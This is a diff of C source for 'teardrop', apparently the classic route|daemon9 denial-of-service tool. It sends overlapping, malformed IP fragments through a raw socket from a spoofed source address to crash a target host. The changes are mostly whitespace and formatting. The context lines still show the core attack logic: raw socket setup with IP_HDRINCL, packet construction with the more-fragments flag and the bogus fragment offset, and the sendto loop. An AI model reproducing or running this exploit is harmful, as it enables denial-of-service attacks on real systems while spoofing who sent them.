@@ -1,3 +1,5 @@
+#define _BSD_SOURCE
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -34,6 +36,7 @@ u_short in_cksum(u_short *, int);
 
 void send_frags(int, u_long, u_long, u_short, u_short);
 
+
 int main(int argc, char **argv)
 {
     int one = 1, count = 0, i, rip_sock;
@@ -43,22 +46,21 @@ int main(int argc, char **argv)
 
     fprintf(stderr, "teardrop   route|daemon9\n\n");
 
-    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    if( (rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW) ) < 0)
     {
         perror("raw socket");
         exit(1);
     }
 
-    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof(one))
-        < 0)
+    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof(one)) < 0)
     {
         perror("IP_HDRINCL");
         exit(1);
     }
 
-    if (argc < 3) usage(argv[0]);
+    if (argc < 3) usage( argv[0] );
 
-    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
+    if ( !( src_ip = name_resolve(argv[1]) ) || !( dst_ip = name_resolve(argv[2]) ) )
     {
         fprintf(stderr, "What the hell kind of IP address is that?\n");
         exit(1);
@@ -82,11 +84,12 @@ int main(int argc, char **argv)
                 break;              /* NOTREACHED */
         }
     }
-    srandom( (unsigned) (time( (time_t) 0) ) );
 
-    if (!src_prt) src_prt = (random() % 0xffff);
+    srandom( (unsigned) ( time( (time_t) 0 ) ) );
+
+    if (!src_prt) src_prt = ( random() % 0xffff);
     
-    if (!dst_prt) dst_prt = (random() % 0xffff);
+    if (!dst_prt) dst_prt = ( random() % 0xffff);
     
     if (!count)   count   = COUNT;
 
@@ -94,6 +97,7 @@ int main(int argc, char **argv)
     addr.s_addr = src_ip;
     fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
     addr.s_addr = dst_ip;
+
     fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
     fprintf(stderr, " Amt: %5d\n", count);
     fprintf(stderr, "[ ");
@@ -104,7 +108,9 @@ int main(int argc, char **argv)
         fprintf(stderr, "b00m ");
         usleep(500);
     }
+    
     fprintf(stderr, "]\n");
+
     return (0);
 }
 
@@ -131,33 +137,34 @@ void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short
     packet = (u_char *) malloc(IPH + UDPH + PADDING);
     p_ptr  = packet;
 
-    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+    bzero( (u_char *) p_ptr, IPH + UDPH + PADDING);
 
     byte = 0x45;                        /* IP version and header length */
-    memcpy(p_ptr, &byte, sizeof(u_char));
+    memcpy(p_ptr, &byte, sizeof(u_char) );
     p_ptr += 2;                         /* IP TOS (skipped) */
-    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
+    *( (u_short *) p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
     p_ptr += 2;
-    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    *( (u_short *) p_ptr) = htons(242);   /* IP id */
     p_ptr += 2;
-    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
+    *( (u_short *) p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
     p_ptr += 2;
-    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    *( (u_short *) p_ptr) = 0x40;         /* IP TTL */
+    
     byte = IPPROTO_UDP;
     memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    
     p_ptr += 4;                         /* IP checksum filled in by kernel */
-    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    *( (u_long *) p_ptr) = src_ip;        /* IP source address */
     p_ptr += 4;
-    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    *( (u_long *) p_ptr) = dst_ip;        /* IP destination address */
     p_ptr += 4;
-    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    *( (u_short *) p_ptr) = htons(src_prt);       /* UDP source port */
     p_ptr += 2;
-    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    *( (u_short *) p_ptr) = htons(dst_prt);       /* UDP destination port */
     p_ptr += 2;
-    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */
+    *( (u_short *) p_ptr) = htons(8 + PADDING);   /* UDP total length */
 
-    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
-                sizeof(struct sockaddr)) == -1)
+    if ( sendto( sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr) ) == -1 )
     {
         perror("\nsendto");
         free(packet);
@@ -171,12 +178,12 @@ void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short
      *  better.
      */
     p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
-    *( (u_short *) p_ptr) = FIX(IPH + MAGIC + 1);
+    *( (u_short *) p_ptr) = FIX( IPH + MAGIC + 1);
     
     p_ptr += 4;                 /* IP offset is 6 bytes into the header */
-    *( (u_short *) p_ptr) = FIX(MAGIC);
+    *( (u_short *) p_ptr) = FIX( MAGIC );
 
-    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr)) == -1)
+    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof( struct sockaddr ) ) == -1)
     {
         perror("\nsendto");
         free(packet);
